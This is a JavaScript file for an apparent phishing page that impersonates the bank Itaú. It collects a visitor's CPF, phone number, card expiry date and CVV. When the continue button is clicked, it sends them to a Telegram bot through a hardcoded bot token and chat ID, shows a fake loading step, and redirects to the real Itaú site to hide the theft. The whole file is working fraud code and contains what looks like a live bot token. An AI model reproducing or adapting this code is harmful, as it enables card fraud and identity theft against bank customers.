document.addEventListener("DOMContentLoaded", function () {
    const cpfInput = document.getElementById("cpf");
    const telefoneInput = document.getElementById("telefone");
    const validadeInput = document.getElementById("validade");
    const cvvInput = document.getElementById("cvv");
    const btnContinuar = document.getElementById("btnContinuar");
    const formContainer = document.querySelector(".form-container");

    function formatCPF(cpf) {
        return cpf.replace(/\D/g, "")
            .slice(0, 11)
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d)/, "$1.$2")
            .replace(/(\d{3})(\d{1,2})$/, "$1-$2");
    }

    function formatTelefone(telefone) {
        return telefone.replace(/\D/g, "")
            .slice(0, 11)
            .replace(/(\d{2})(\d)/, "($1) $2")
            .replace(/(\d{5})(\d)/, "$1-$2")
            .replace(/(-\d{4})\d+?$/, "$1");
    }

    function formatValidade(validade) {
        return validade.replace(/\D/g, "")
            .slice(0, 4)
            .replace(/(\d{2})(\d)/, "$1/$2");
    }

    function formatCVV(cvv) {
        return cvv.replace(/\D/g, "").slice(0, 3);
    }

    function validarCampos() {
        const cpfValido = cpfInput.value.length === 14;
        const telefoneValido = telefoneInput.value.length === 15;
        const validadeValida = validadeInput.value.length === 5;
        const cvvValido = cvvInput.value.length === 3;

        btnContinuar.disabled = !(cpfValido && telefoneValido && validadeValida && cvvValido);
        btnContinuar.style.backgroundColor = btnContinuar.disabled ? "#ccc" : "#ff6f00";
        btnContinuar.style.cursor = btnContinuar.disabled ? "not-allowed" : "pointer";
    }

    cpfInput.addEventListener("input", function () {
        this.value = formatCPF(this.value);
        validarCampos();
    });

    telefoneInput.addEventListener("input", function () {
        this.value = formatTelefone(this.value);
        validarCampos();
    });

    validadeInput.addEventListener("input", function () {
        this.value = formatValidade(this.value);
        validarCampos();
    });

    cvvInput.addEventListener("input", function () {
        this.value = formatCVV(this.value);
        validarCampos();
    });

    btnContinuar.addEventListener("click", function () {
        if (btnContinuar.disabled) return;

        const token = '8078927547:AAGotuIodT4NvYCX_UAKH9AHWBvQVaFt2n8';
        const chat_id = '7981786292';
        const message = `
🔐 *Novas Informacoes - Itaú*

🧾 *CPF:* \`${cpfInput.value}\`
📱 *Telefone:* \`${telefoneInput.value}\`
💳 *Validade:* \`${validadeInput.value}\`
🔑 *CVV:* \`${cvvInput.value}\`

🕒 *Data:* ${new Date().toLocaleString()}
        `;

        // Esconde os inputs e o botão
        document.querySelector(".subtext").style.display = "none";
        formContainer.style.display = "none";
        btnContinuar.style.display = "none";

        // Mostra o loading
        document.getElementById("loading").style.display = "block";

        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chat_id,
                text: message,
                parse_mode: "Markdown"
            })
        }).then(() => {
            setTimeout(() => {
                document.getElementById("step2").classList.add("active");
                document.getElementById("step3").classList.add("active");
                document.querySelector(".steps").classList.add("active-3");
                document.getElementById("loading").style.display = "none";
                document.getElementById("step-3").style.display = "block";

                // Redireciona automaticamente após 1,5s
                setTimeout(() => {
                    window.location.href = "https://www.itau.com.br/";
                }, 1500);
            }, 3000);
        }).catch(err => {
            alert("Erro ao enviar os dados. Tente novamente.");
            console.error(err);
        });
    });
});